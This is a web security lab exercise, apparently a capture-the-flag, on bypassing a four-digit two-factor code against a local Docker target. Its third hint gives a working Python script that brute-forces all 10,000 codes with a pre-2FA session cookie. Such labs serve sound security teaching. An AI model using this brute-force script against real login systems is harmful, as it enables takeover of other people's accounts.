# Lab 09 — 2FA bypass using a brute-force attack

**Difficulty:** ★★★ Expert
**Goal:** log in as `administrator` and read the flag from `/admin`
**You have:** a working account `wiener` / `peter`
**You can find:** the administrator's password in the downloadable list

The administrator's 2FA code is four digits and never appears on screen.
Four digits is a space you can enumerate.

## Hint ladder

**Hint 1 (stuck):** Log in as `administrator` (password from the wordlist)
and land on `/login2`. Enter a wrong code, then another, then another. Does
anything throttle, expire, or block you? What is the full candidate space?

**Hint 2 (still stuck):** 0000–9999 = 10,000 possibilities, and the session
stays in the pre-2FA state the whole time you're guessing. Nothing stops
you except the placement of the right number. A small script beats human
typing.

**Hint 3 (last rung — the actual attack):**
```python
import requests
for code in range(10000):
    r = requests.post("http://127.0.0.1:8109/login2",
                      data={"code": f"{code:04d}"},
                      cookies={"session": "<your pre-2FA session>"},
                      allow_redirects=False)
    if r.status_code == 302:
        print("found:", f"{code:04d}"); break
```
Then read `/admin` with the same session cookie.

## Reset

```bash
docker compose restart lab09-2fa-brute-force
```